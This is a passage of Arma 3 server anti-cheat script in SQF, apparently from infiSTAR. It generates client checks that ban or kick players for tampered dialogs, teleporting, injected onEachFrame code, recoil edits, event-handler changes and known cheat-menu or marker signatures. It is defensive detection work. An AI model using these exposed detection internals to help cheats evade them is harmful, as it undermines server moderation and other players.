"+_AHKickOFF+";                                                      };                                                      "; }else{ _A3AHstring = _A3AHstring + "                                                      _ctrlcount602 = 82;                                                      if(_cntallCtrls602 != _ctrlcount602)then                                                      {                                                            _log = format['BadControls count on D602: %1 should be %2',_cntallCtrls602,_ctrlcount602];                                                            [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                            (findDisplay 602) closeDisplay 0;closeDialog 0;closeDialog 0;closeDialog 0;                                                            _badcontrols602 = true;                                                            [] spawn "+_AHKickOFF+";                                                      };                                                      "; }; _A3AHstring = _A3AHstring + "                                                };                                          };                                          uiSleep 2;                                          "; }; _A3AHstring = _A3AHstring + "                                          "; if(_C00)then { _A3AHstring = _A3AHstring + "                                          if(!_badcontrols00)then                                          {                                                _0controlsA = allControls findDisplay 0;                                                if!(_0controlsA isEqualTo _00controlsO)then                                                {                                                      {                                                            _badcontrol = str _x;                                                            if!(_badcontrol in _00controlsO)then                                                            {                                                                  _log = format['BadControl on D00: %1',_badcontrol];                                                                  [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                  (findDisplay 0) closeDisplay 0;closeDialog 0;closeDialog 0;closeDialog 0;                                                                  _badcontrols00 = true;                                                                  [] spawn "+_AHKickOFF+";                                                            };                                                      } forEach _0controlsA;                                                };                                          };                                          uiSleep 2;                                          "; }; _A3AHstring = _A3AHstring + "                                          "; if(_C12)then { _A3AHstring = _A3AHstring + "                                          if(!_badcontrols12)then                                          {                                                if(!isNull findDisplay 12)then                                                {                                                      _12controlsA = allControls findDisplay 12;                                                      _12controlscntA = count _12controlsA;                                                      if(_12controlscntA isEqualTo _12controlscntO)then                                                      {                                                            if!(_12controlsA isEqualTo _12controlsO)then                                                            {                                                                  {                                                                        _badcontrol = str _x;                                                                        if!(_badcontrol in _12controlsO)then                                                                        {                                                                              _log = format['BadControl on D12: %1',_badcontrol];                                                                              [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                              (findDisplay 12) closeDisplay 0;closeDialog 0;closeDialog 0;closeDialog 0;                                                                              _badcontrols12 = true;                                                                              [] spawn "+_AHKickOFF+";                                                                        };                                                                  } forEach _12controlsA;                                                            };                                                      }                                                      else                                                      {                                                            _log = format['BadControls count on D12: %1 should be %2',_12controlscntA,_12controlscntO];                                                            [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                            (findDisplay 12) closeDisplay 0;closeDialog 0;closeDialog 0;closeDialog 0;                                                            _badcontrols12 = true;                                                            [] spawn "+_AHKickOFF+";                                                      };                                                };                                          };                                          uiSleep 2;                                          "; }; _A3AHstring = _A3AHstring + "                                          "; if(_C18)then { _A3AHstring = _A3AHstring + "                                          if(!_badcontrols18)then                                          {                                                if(!isNull findDisplay 18)then                                                {                                                      _18controlsA = allControls findDisplay 18;                                                      _18controlscntA = count _18controlsA;                                                      if(_18controlscntA isEqualTo _18controlscntO)then                                                      {                                                            if!(_18controlsA isEqualTo _18controlsO)then                                                            {                                                                  {                                                                        _badcontrol = str _x;                                                                        if!(_badcontrol in _18controlsO)then                                                                        {                                                                              _log = format['BadControl on D18: %1',_badcontrol];                                                                              [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                              (findDisplay 18) closeDisplay 0;closeDialog 0;closeDialog 0;closeDialog 0;                                                                              _badcontrols18 = true;                                                                              [] spawn "+_AHKickOFF+";                                                                        };                                                                  } forEach _18controlsA;                                                            };                                                      }                                                      else                                                      {                                                            _log = format['BadControls count on D18: %1 should be %2',_18controlscntA,_18controlscntO];                                                            [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                                                                        _18controlsAstringified = [];                                                            {_18controlsAstringified pushBack (str _x);} forEach _18controlsA;                                                            _log = str _18controlsAstringified;                                                            [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                            [] spawn "+_AHKickOFF+";                                                                                                                        (findDisplay 18) closeDisplay 0;closeDialog 0;closeDialog 0;closeDialog 0;                                                            _badcontrols18 = true;                                                      };                                                };                                          };                                          uiSleep 2;                                          "; }; _A3AHstring = _A3AHstring + "                                          "; if(_C24)then { _A3AHstring = _A3AHstring + "                                          if(!_badcontrols24)then                                          {                                                if(!isNull findDisplay 24)then                                                {                                                      _24controlsA = allControls findDisplay 24;                                                      _24controlscntA = count _24controlsA;                                                      _24controlscntO = 2;                                                      if(_24controlscntA isEqualTo _24controlscntO)then                                                      {                                                            if!(_24controlsA isEqualTo _24controlsO)then                                                            {                                                                  {                                                                        _badcontrol = str _x;                                                                        if!(_badcontrol in _24controlsO)then                                                                        {                                                                              _log = format['BadControl on D24: %1',_badcontrol];                                                                              [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                              (findDisplay 24) closeDisplay 0;closeDialog 0;closeDialog 0;closeDialog 0;                                                                              _badcontrols24 = true;                                                                              [] spawn "+_AHKickOFF+";                                                                        };                                                                  } forEach _24controlsA;                                                            };                                                      }                                                      else                                                      {                                                            _log = format['BadControls count on D24: %1 should be %2',_24controlscntA,_24controlscntO];                                                            [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                            (findDisplay 24) closeDisplay 0;closeDialog 0;closeDialog 0;closeDialog 0;                                                            _badcontrols24 = true;                                                            [] spawn "+_AHKickOFF+";                                                      };                                                };                                          };                                          uiSleep 2;                                          "; }; _A3AHstring = _A3AHstring + "                                          "; if(_C46)then { _A3AHstring = _A3AHstring + "                                          if(!_badcontrols46)then                                          {                                                if(!isNull findDisplay 46)then                                                {                                                      _46controlsA = allControls findDisplay 46;                                                      _46controlscntA = count _46controlsA;                                                      if(_46controlscntA isEqualTo _46controlscntO)then                                                      {                                                            if!(_46controlsA isEqualTo _46controlsO)then                                                            {                                                                  {                                                                        _badcontrol = str _x;                                                                        if!(_badcontrol in _46controlsO)then                                                                        {                                                                              _log = format['BadControl on D46: %1',_badcontrol];                                                                              [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                              (findDisplay 46) closeDisplay 0;closeDialog 0;closeDialog 0;closeDialog 0;                                                                              _badcontrols46 = true;                                                                              [] spawn "+_AHKickOFF+";                                                                        };                                                                  } forEach _46controlsA;                                                            };                                                      }                                                      else                                                      {                                                            _log = format['BadControls count on D46: %1 should be %2',_46controlscntA,_46controlscntO];                                                            [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                                                                        _46controlsAstringified = [];                                                            {_46controlsAstringified pushBack (str _x);} forEach _46controlsA;                                                            _log = str _46controlsAstringified;                                                            [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                            [] spawn "+_AHKickOFF+";                                                                                                                        (findDisplay 46) closeDisplay 0;closeDialog 0;closeDialog 0;closeDialog 0;                                                            _badcontrols46 = true;                                                      };                                                };                                          };                                          uiSleep 2;                                          "; }; _A3AHstring = _A3AHstring + "                                          "; if(_C70)then { _A3AHstring = _A3AHstring + "                                                                        if(!_badcontrols70)then                                          {                                                if(!isNull findDisplay 70)then                                                {                                                      _70controlsA = allControls findDisplay 70;                                                      _70controlscntA = count _70controlsA;                                                      if(_70controlscntA isEqualTo _70controlscntO)then                                                      {                                                            if!(_70controlsA isEqualTo _70controlsO)then                                                            {                                                                  {                                                                        _badcontrol = str _x;                                                                        if!(_badcontrol in _70controlsO)then                                                                        {                                                                              _log = format['BadControl on D70: %1',_badcontrol];                                                                              [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                              (findDisplay 70) closeDisplay 0;closeDialog 0;closeDialog 0;closeDialog 0;                                                                              _badcontrols70 = true;                                                                              [] spawn "+_AHKickOFF+";                                                                        };                                                                  } forEach _70controlsA;                                                            };                                                      }                                                      else                                                      {                                                            _log = format['BadControls count on D70: %1 should be %2',_70controlscntA,_70controlscntO];                                                            [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                            (findDisplay 70) closeDisplay 0;closeDialog 0;closeDialog 0;closeDialog 0;                                                            _badcontrols70 = true;                                                            [] spawn "+_AHKickOFF+";                                                      };                                                };                                          };                                          uiSleep 2;                                          "; }; _A3AHstring = _A3AHstring + "                                    };                              };                              "; }; _A3AHstring = _A3AHstring + "                              "; if(_EHF || _CAP)then { _A3AHstring = _A3AHstring + "                              [_name,_puid] spawn {                                    _name = _this select 0;                                    _puid = _this select 1;                                    uiSleep 10;                                    _acnt = -1;                                    _object = player;                                    _caughtFired = 0;                                    _randomIDcount = 0;                                    while {1 == 1} do                                    {                                          _tmpObj = player;                                          if((!isNull player) && (alive player))then                                          {                                                "; if(_EHF)then { _A3AHstring = _A3AHstring + "                                                player removeAllEventHandlers 'Fired';                                                _randomIDcount = round(random 3);                                                for '_i' from 1 to _randomIDcount do                                                {                                                      player addEventHandler ['Fired',{}];                                                };                                                "; if(_MOD == 'AltisLife')then { _A3AHstring = _A3AHstring + "                                                      player addEventHandler ['Fired',{_this call life_fnc_onFired}];                                                "; }; _A3AHstring = _A3AHstring + "                                                "; if(_MOD == 'Epoch')then { _A3AHstring = _A3AHstring + "                                                      player addEventHandler ['Fired',{_this call EPOCH_fnc_playerFired}];                                                "; }; _A3AHstring = _A3AHstring + "                                                      player addEventHandler ['Fired',{if(inSafeZone)then {deleteVehicle (_this select 6)}}];                                                "; }; _A3AHstring = _A3AHstring + "                                          };                                          uiSleep 2;                                          if((!isNull player) && (alive player))then                                          {                                                if(player isEqualTo _tmpObj)then                                                {                                                      "; if(_EHF)then { _A3AHstring = _A3AHstring + "                                                      player addEventHandler ['Fired',{_this call "+_FiredCheck+"}];                                                      _id = player addEventHandler ['Fired',{_this call "+str _customFiredEventhandler+"}];                                                      _maxid = (3+_randomIDcount);                                                      if(_id != _maxid)then                                                      {                                                            _caughtFired = _caughtFired + 1;                                                            if(_caughtFired > 2)then                                                            {                                                                  if(_id == _maxid+1)then                                                                  {                                                                        _log = format['EH_FIRED: %1 (KICKED TO LOBBY) might be EpochCode interfering',_id];                                                                        [_name,_puid,'SLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                                        (findDisplay 46) closeDisplay 0;                                                                  }                                                                  else                                                                  {                                                                        _log = format['EH_FIRED: %1',_id];                                                                        [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                        [] spawn "+_AHKickOFF+";                                                                  };                                                            };                                                      };                                                      "; }; _A3AHstring = _A3AHstring + "                                                      "; if(_CAP)then { _A3AHstring = _A3AHstring + "                                                      if(player == _object)then [{_acnt = _acnt + 1},{_object = player;_acnt = 0}];                                                      _id = player addAction ['', '', [], -5, false, true, '', 'false'];                                                      player removeAction _id;                                                      if(_id != _acnt)then                                                      {                                                            removeAllActions player;removeAllActions (vehicle player);                                                            _log = format['Actions: %1/%2',_id,_acnt];                                                            [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                            [] spawn "+_AHKickOFF+";                                                      };                                                      "; }; _A3AHstring = _A3AHstring + "                                                };                                          };                                    };                              };                              "; }; _A3AHstring = _A3AHstring + "                              "+_AH_RunCheckARRAY+" pushBack 5;                        };                        if!(6 in "+_AH_RunCheckARRAY+")then                        {                              "; if(_UAT)then { _A3AHstring = _A3AHstring + "                                    [_name,_puid] spawn {                                          private['_name','_puid','_mPos','_tpc','_fnc_revertTp','_lastpos','_lastHeightATL','_log','_fnc_setVars','_tmpplayer','_lasttime','_difftime'];                                          _name = _this select 0;                                          _puid = _this select 1;                                          "+_AHpos+" = [];                                          _mPos = "+str _mPos+";                                          _mPos = [_mPos select 0,_mPos select 1,0];                                          _tpc = 0;                                          _fnc_revertTp = {                                                player SetVelocity [0,0,0];                                                (vehicle player) SetVelocity [0,0,0];                                                player setPosATL _lastpos;                                                (vehicle player) setPosATL _lastpos;                                                _log = format['POTENTIAL-TP-REVERTED %1m from %2 to %3. TopSpeed of %4 is %5 speed was %6',round _distance,_lastpos,_curpos,_type,_topSpeed,_speed];                                                [_name,_puid,'SLOG',toArray(_log)] call "+_AH120KICKLOG+";                                          };                                          _fnc_setVars = {                                                _lastpos = getPosATL (vehicle player);                                                _lastHeightATL = _lastpos select 2;                                                _lastpos = [_lastpos select 0,_lastpos select 1,0];                                                _tmpplayer = player;                                                _lasttime = time;                                          };                                          call _fnc_setVars;                                          waitUntil {                                                _difftime = time - _lasttime;                                                if(_difftime > 0.35) then                                                {                                                      if(alive player)then                                                      {                                                            _curpos = getPosATL (vehicle player);                                                            _curHeightATL = _curpos select 2;                                                            _curpos = [_curpos select 0,_curpos select 1,0];                                                            if(vehicle player == player)then                                                            {                                                                  _velZ = (velocity player) select 2;                                                                  if(((_curHeightATL - _lastHeightATL) > 30)&&(_velZ < -5)) then                                                                  {                                                                        call _fnc_revertTp;                                                                  };                                                            };                                                            _distance = _lastpos distance _curpos;                                                            _speed = _distance / _difftime;                                                            _type = typeOf (vehicle player);                                                            _topSpeed = getNumber(configFile >> 'CfgVehicles' >> _type >> 'maxSpeed');                                                            if(_topSpeed < 10)then {_topSpeed = 10;};                                                            if(_speed > _topSpeed)then                                                            {                                                                  _antitp = call {                                                                        if(_lastpos distance _mPos <= 50)exitWith{false};                                                                        if(!(_tmpplayer isEqualTo player)&&(_curpos distance _mPos <= 50))exitWith{false};                                                                        true                                                                  };                                                                  if(_antitp)then                                                                  {                                                                        if((str player == str(driver(vehicle player))) || (isNull (driver(vehicle player))))then                                                                        {                                                                              if(!isNil '"+_AHpos+"')then                                                                              {                                                                                    if(typeName "+_AHpos+" != 'ARRAY')then                                                                                    {                                                                                          _log = format['Admin Teleport Variable highjacked! Type now: %1',typeName "+_AHpos+"];                                                                                          [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                                          [] spawn "+_AHKickOFF+";                                                                                    };                                                                                    if("+_AHpos+" isEqualTo [])then                                                                                    {                                                                                          if(_distance >= 25)then                                                                                          {                                                                                                if(visiblemap)then {_tpc = 9000+127;};                                                                                                _tpc = _tpc + 1;                                                                                                if(_tpc >= 2)then                                                                                                {                                                                                                      _log = format['TP %1m from %2 to %3. TopSpeed of %4 is %5 speed was %6',round _distance,_lastpos,_curpos,_type,_topSpeed,_speed];                                                                                                      [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                                                      [] spawn "+_AHKickOFF+";                                                                                                }                                                                                                else                                                                                                {                                                                                                      call _fnc_revertTp;                                                                                                };                                                                                          }                                                                                          else                                                                                          {                                                                                                call _fnc_revertTp;                                                                                          };                                                                                    }                                                                                    else                                                                                    {                                                                                          _tmpAHpos = "+_AHpos+";                                                                                          "+_AHpos+" = [];                                                                                          _log = 'Teleported by Admin';                                                                                          [_name,_puid,'TPLOG',toArray(_log),_tmpAHpos select 0,_tmpAHpos select 1,_lastpos,_curpos] call "+_AH120KICKLOG+";                                                                                    };                                                                              }                                                                              else                                                                              {                                                                                    _log = 'TELEPORT CHECK VARIABLE NILLED!';                                                                                    [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                                    [] spawn "+_AHKickOFF+";                                                                              };                                                                        }                                                                        else                                                                        {                                                                              if(!isNull (driver(vehicle player)))then                                                                              {                                                                                    if!(isPlayer (driver(vehicle player)))then                                                                                    {                                                                                          _log = format['TP with AI as driver.. %1m from %2 to %3. TopSpeed of %4 is %5 speed was %6',round _distance,_lastpos,_curpos,_type,_topSpeed,_speed];                                                                                          [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                                          [] spawn "+_AHKickOFF+";                                                                                    };                                                                              };                                                                        };                                                                  };                                                            };                                                      };                                                      call _fnc_setVars;                                                };                                                1 != 1                                          };                                          _log = 'TELEPORT CHECKS BROKEN';                                          [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                          [] spawn "+_AHKickOFF+";                                    };                              "; }; _A3AHstring = _A3AHstring + "                              "+_AH_RunCheckARRAY+" pushBack 6;                        };                        if!(7 in "+_AH_RunCheckARRAY+")then                        {                              [_name,_puid] spawn {                                    _name = _this select 0;                                    _puid = _this select 1;                                    diag_log format['LOCALPLAYERINFO: %1(%2) | %3(%4) | %5',_name,_puid,str _name,str _puid,str (getPlayerUID player)];                                    PVAH_AdminReq = nil;                                    if(!isNil 'PVAH_AdminReq')then                                    {                                          _log = format['BadVar: PVAH_AdminReq - %1',PVAH_AdminReq];                                          [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                          [] spawn "+_AHKickOFF+";                                    };                                    _FTG = "+str _FTG+";                                    "; if(_REF)then { _A3AHstring = _A3AHstring + "                                          "+_oneachframe+"=time;                                    "; }; _A3AHstring = _A3AHstring + "                                    while {1 == 1} do                                    {                                          _randomshit = round(random 9999);                                          PVAH_AdminReq = _randomshit;                                          if(str PVAH_AdminReq != str _randomshit)then                                          {                                                _log = 'BadVar: PVAH_AdminReq';                                                [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                [] spawn "+_AHKickOFF+";                                          };                                          "; if(_REF)then { _A3AHstring = _A3AHstring + "                                          if(typeName "+_oneachframe+" != 'SCALAR')then                                          {                                                _log = format['onEachFrame injector detected - %1',typeName "+_oneachframe+"];                                                [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                [] spawn "+_AHKickOFF+";                                          };                                          if(time - "+_oneachframe+" > 20)then                                          {                                                _log = format['onEachFrame injector detected - %1 (either lag spike on client or ESP Hack/Godmoe.. bad things..)',time - "+_oneachframe+"];                                                [_name,_puid,'HLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                [] spawn "+_AHKickOFF+";                                          };                                          onEachFrame {                                                "+_oneachframe+"=time;                                                "; if(_MOD == 'EPOCH')then { _A3AHstring = _A3AHstring + "                                                call EPOCH_onEachFrame;                                                "; }; _A3AHstring = _A3AHstring + "                                                "; if((str _rOEF != '{}')&&(typeName _rOEF == 'CODE'))then { _A3AHstring = _A3AHstring + "                                                call "+str _rOEF+";                                                "; }; _A3AHstring = _A3AHstring + "                                          };                                          "; }; _A3AHstring = _A3AHstring + "                                          "; if(_OAP)then { _A3AHstring = _A3AHstring + "                                                removeAllActions player;removeAllActions (vehicle player);                                          "; }; _A3AHstring = _A3AHstring + "                                          "; if(_OMC)then { _A3AHstring = _A3AHstring + "                                                onMapSingleClick '';                                          "; }; _A3AHstring = _A3AHstring + "                                          setTerrainGrid _FTG;                                          "; if(_RAD)then { _A3AHstring = _A3AHstring + "                                                player allowDamage true;                                                (vehicle player) allowDamage true;                                          "; }; _A3AHstring = _A3AHstring + "                                          "; if(_URC)then { _A3AHstring = _A3AHstring + "                                          if(unitRecoilCoefficient player == -1)then {player setunitRecoilCoefficient 1;};                                          if(abs(unitRecoilCoefficient player) != 1)then {                                                _log = format['BadRecoil %1 | %2 %3 %4',unitRecoilCoefficient player,typeOf player,typeOf (vehicle player),currentWeapon player];                                                [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                [] spawn "+_AHKickOFF+";                                          };                                          "; }; _A3AHstring = _A3AHstring + "                                          uiSleep 0.1;                                          _uid = getPlayerUID player;                                          if((_uid != '') && {_puid != _uid} && {alive player})then {                                                _log = format['_puid != _uid (%1/%2)',_puid,_uid];                                                [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                [] spawn "+_AHKickOFF+";                                          };                                          "; if(_CLM)then { _A3AHstring = _A3AHstring + "                                                if(!isNil'"+_MC+"')then {"+_MC+"=nil;};                                                '"+_MC+"' addPublicVariableEventHandler                                                {                                                      "+_MC+"=nil;                                                      _array = _this select 1;                                                      _a = ['_USER_DEFINED','[',']'];                                                      if("+str _UMW+")then {_a = _a + "+str _aLocalM+";};                                                      _foundbad = [];                                                      {                                                            _m = _x;                                                            _lowm = toLower _m;                                                            if(_m != '')then                                                            {                                                                  if(_lowm find 'swag' != -1)then                                                                  {                                                                        _foundbad pushBack _m;                                                                        _mtext = markerText _m;                                                                        if(_mtext != '')then {_foundbad pushBack _mtext;};                                                                  }                                                                  else                                                                  {                                                                        if!(_m in _array)then                                                                        {                                                                              _do = true;                                                                              {if(_lowm find (toLower _x) > -1)exitWith {_do = false;};} forEach _a;                                                                              if(_do)then                                                                              {                                                                                    _foundbad pushBack _m;                                                                                    _mtext = markerText _m;                                                                                    if(_mtext != '')then {_foundbad pushBack _mtext;};                                                                              };                                                                        };                                                                  };                                                            };                                                      } forEach allMapMarkers;                                                      if(str _foundbad != '[]')then                                                      {                                                            _log = format['LocalMarker: %1',_foundbad];                                                            [profileName,getPlayerUID player,'HLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                            [] spawn "+_AHKickOFF+";                                                      };                                                };                                          "; }; _A3AHstring = _A3AHstring + "                                    };                              };                              "+_AH_RunCheckARRAY+" pushBack 7;                        };                        if!(8 in "+_AH_RunCheckARRAY+")then                        {                              "; if((_VON) || (_CMC))then { _A3AHstring = _A3AHstring + "                                    [_name,_puid] spawn {                                          _name = _this select 0;                                          _puid = _this select 1;                                          _voicecount = 0;                                          _find1 = toLower('#USER');                                          _find2 = toLower('BIS_');                                          while {1 == 1} do                                          {                                                "; if(_VON)then { _A3AHstring = _A3AHstring + "                                                if((!isNull findDisplay 63) && {!isNull findDisplay 55} && {(ctrlText (findDisplay 63 displayCtrl 101)) in [localize 'str_channel_global',localize 'str_channel_side']})then                                                {                                                      _msg = '<infiSTAR.de> NO VOICE ON SIDE/GLOBAL!';                                                      hint _msg;                                                      1 cutText [format ['%1',_msg],'WHITE IN'];                                                      systemChat _msg;                                                      uiSleep 0.1;                                                      _voicecount = _voicecount + 1;                                                      if(_voicecount > 1)then {                                                            player setHitPointDamage ['HitLegs',1];                                                      };                                                      if(_voicecount > 3)then {                                                            _voicecount = 0;                                                            {player setHitPointDamage [_x,1];} forEach ['HitBody','HitHead'];                                                      };                                                };                                                "; }; _A3AHstring = _A3AHstring + "                                                "; if(_CMC)then { _A3AHstring = _A3AHstring + "                                                _commandingMenu = commandingMenu;                                                if(((toLower _commandingMenu) find _find2) > -1)then                                                {                                                      _searchIn = toLower(str bis_menu_groupcommunication);                                                      if(_searchIn find 'lystic' > -1)then                                                      {                                                            _log = format['BIS_Menu_GroupCommunication: %1',str bis_menu_groupcommunication];                                                            [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                            [] spawn "+_AHKickOFF+";                                                      };                                                      showCommandingMenu '';                                                };                                                _commandingMenu = commandingMenu;                                                if((_commandingMenu != '') && {!(_commandingMenu in "+str _cMenu+")})then                                                {                                                      if(((toLower _commandingMenu) find _find1) > -1)then                                                      {                                                            _log = format['BadCommandingMenu: %1',_commandingMenu];                                                            [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                            [] spawn "+_AHKickOFF+";                                                      };                                                };                                                "; }; _A3AHstring = _A3AHstring + "                                                uiSleep 0.75;                                          };                                    };                              "; }; _A3AHstring = _A3AHstring + "                              "+_AH_RunCheckARRAY+" pushBack 8;                        };                        if!(9 in "+_AH_RunCheckARRAY+")then                        {                              "+_ninetwothread+" = [_name,_puid] spawn {                                    _name = _this select 0;                                    _puid = _this select 1;                                    _mytime = time + 45;                                    waitUntil {((!isNil '"+_ninetwo+"') || (time > _mytime))};                                    if(isNil '"+_ninetwo+"')then                                    {                                          _log = 'Secondary checks not running.. kicked after waiting 45 seconds for a 2 seconds timer..';                                          [_name,_puid,'SLOG',toArray(_log)] call "+_AH120KICKLOG+";                                          [] spawn "+_AHKickOFF+";                                    };                              };                              [_name,_puid,_admins] spawn {                                    _name = _this select 0;                                    _puid = _this select 1;                                    _admins = _this select 2;                                    _ForbiddenItems = "+str _ForbiddenItems+";                                    "; if(_MOD == 'EPOCH')then { _A3AHstring = _A3AHstring + "                                          _ForbiddenOnEpochOnly = "+str _ForbiddenOnEpochOnly+";                                          _ForbiddenItems = _ForbiddenItems + _ForbiddenOnEpochOnly;                                          if(isNil 'EPOCH_target')then {EPOCH_target = objNull;};                                          if(isNil 'EPOCH_currentVehicle')then {EPOCH_currentVehicle = vehicle player;};                                          if(isNil 'EPOCH_playerEnergy')then {EPOCH_playerEnergy = 0;};                                          if(isNil 'EPOCH_playerHunger')then {EPOCH_playerHunger = 5000;};                                          if(isNil 'EPOCH_playerThirst')then {EPOCH_playerThirst = 2500;};                                          if(isNil 'EPOCH_playerStamina')then {EPOCH_playerStamina = 100;};                                          if(isNil 'EPOCH_playerCrypto')then {EPOCH_playerCrypto = 0;} else {if(EPOCH_playerCrypto < 0)then {EPOCH_playerCrypto = 0;};};                                          if(isNil 'EPOCH_clientInit')then {EPOCH_clientInit = compile preprocessFileLineNumbers '\x\addons\a3_epoch_code\compile\setup\EPOCH_clientInit.sqf';};                                          if(isNil 'EPOCH_onEachFrame')then {EPOCH_onEachFrame = compile preprocessFileLineNumbers '\x\addons\a3_epoch_code\compile\EPOCH_onEachFrame.sqf';};                                          if(isNil 'EPOCH_client_rejectPlayer')then {EPOCH_client_rejectPlayer = compile preprocessFileLineNumbers '\x\addons\a3_epoch_code\compile\setup\EPOCH_client_rejectPlayer.sqf';};                                          if(isNil 'EPOCH_clientRespawn')then {EPOCH_clientRespawn = compile preprocessFileLineNumbers '\x\addons\a3_epoch_code\compile\setup\EPOCH_clientRespawn.sqf';};                                          if(isNil 'EPOCH_fnc_playerDeath')then {EPOCH_fnc_playerDeath = compile preprocessFileLineNumbers '\x\addons\a3_epoch_code\compile\functions\EPOCH_fnc_playerDeath.sqf';};                                          if(isNil 'EPOCH_KeyDown')then {EPOCH_KeyDown = compile preprocessFileLineNumbers '\x\addons\a3_epoch_code\compile\interface_event_handlers\EPOCH_KeyDown.sqf';};                                          if(isNil 'EPOCH_pushCustomVar')then {EPOCH_pushCustomVar = compile preprocessFileLineNumbers '\x\addons\a3_epoch_code\compile\functions\EPOCH_pushCustomVar.sqf';};                                          if(isNil 'EPOCH_handleGetOut')then {EPOCH_handleGetOut = compile preprocessFileLineNumbers '\x\addons\a3_epoch_code\compile\EPOCH_antiWall.sqf';};                                          if(isNil 'EPOCH_fnc_playerFired')then {EPOCH_fnc_playerFired = compileFinal preprocessFileLineNumbers '\x\addons\a3_epoch_code\compile\functions\EPOCH_fnc_playerFired.sqf';};                                          _EPOCH_clientInit = compile preprocessFileLineNumbers '\x\addons\a3_epoch_code\compile\setup\EPOCH_clientInit.sqf';                                          _EPOCH_onEachFrame = compile preprocessFileLineNumbers '\x\addons\a3_epoch_code\compile\EPOCH_onEachFrame.sqf';                                          _EPOCH_client_rejectPlayer = compile preprocessFileLineNumbers '\x\addons\a3_epoch_code\compile\setup\EPOCH_client_rejectPlayer.sqf';                                          _EPOCH_clientRespawn = compile preprocessFileLineNumbers '\x\addons\a3_epoch_code\compile\setup\EPOCH_clientRespawn.sqf';                                          _EPOCH_fnc_playerDeath = compile preprocessFileLineNumbers '\x\addons\a3_epoch_code\compile\functions\EPOCH_fnc_playerDeath.sqf';                                          _EPOCH_KeyDown = compile preprocessFileLineNumbers '\x\addons\a3_epoch_code\compile\interface_event_handlers\EPOCH_KeyDown.sqf';                                          _EPOCH_pushCustomVar = compile preprocessFileLineNumbers '\x\addons\a3_epoch_code\compile\functions\EPOCH_pushCustomVar.sqf';                                          _EPOCH_handleGetOut = compile preprocessFileLineNumbers '\x\addons\a3_epoch_code\compile\EPOCH_antiWall.sqf';                                          _EPOCH_fnc_playerFired = compileFinal preprocessFileLineNumbers '\x\addons\a3_epoch_code\compile\functions\EPOCH_fnc_playerFired.sqf';                                          _rnd1 = round(random 99999);life_cash = _rnd1;                                          _rnd2 = round(random 99999);life_adminlevel = _rnd2;                                          _rnd3 = round(random 99999);life_coplevel = _rnd3;                                          _rnd4 = round(random 99999);life_fnc_MPexec = _rnd4;                                          _rnd5 = round(random 99999);life_atmcash = _rnd5;                                    "; }; _A3AHstring = _A3AHstring + "                                    _caeM1 = 0;                                    _caeM2 = 0;                                    _vehptype = typeOf (vehicle player);                                    _lvlcheck = time;                                    _rnd6 = round(random 99999);"+_checkidicheckcheck+" = _rnd6;                                    if(isNil'inSafeZone')then {inSafeZone=false;};                                    "; if(_MOH)then { _A3AHstring = _A3AHstring + "                                    _idMouseMoving1251 = 0;                                    _caughtMouseMoving = 0;                                    "; }; _A3AHstring = _A3AHstring + "                                    _fnc_hasTV = {                                          if('optic_tws' in _primWeapItems)exitWith{false};                                          if('optic_tws_mg' in _primWeapItems)exitWith{false};                                          if('optic_mas_term' in _primWeapItems)exitWith{false};                                          if('Laserdesignator' in _primWeapItems)exitWith{false};                                          if('acc_mas_pointer_IR' in _primWeapItems)exitWith{false};                                          if('acc_pointer_IR' in _primWeapItems)exitWith{false};                                          true                                    };                                    _fnc_hasNV = {                                          if('optic_Nightstalker' in _primWeapItems)exitWith{false};                                          if('optic_NVS' in _primWeapItems)exitWith{false};                                          true                                    };                                    while {1 == 1} do                                    {                                          "; if(_MOH)then { _A3AHstring = _A3AHstring + "                                          _lastidMouseMoving1251 = _idMouseMoving1251+1;                                          _idMouseMoving1251 = ((findDisplay 12) displayCtrl 51) ctrlAddEventHandler ['MouseMoving',''];                                          if(_lastidMouseMoving1251 != _idMouseMoving1251) then                                          {                                                if(_caughtMouseMoving > 0) then                                                {                                                      _log = format['MouseMoving EventHandler added:   %1 should be %2',_lastidMouseMoving1251,_idMouseMoving1251];                                                      [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                      [] spawn "+_AHKickOFF+";                                                };                                                _caughtMouseMoving = _caughtMouseMoving + 1;                                          };                                          "; }; _A3AHstring = _A3AHstring + "                                          if(isNil 'inSafeZone')then                                          {                                                _log = 'inSafeZone is Nil';                                                [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                [] spawn 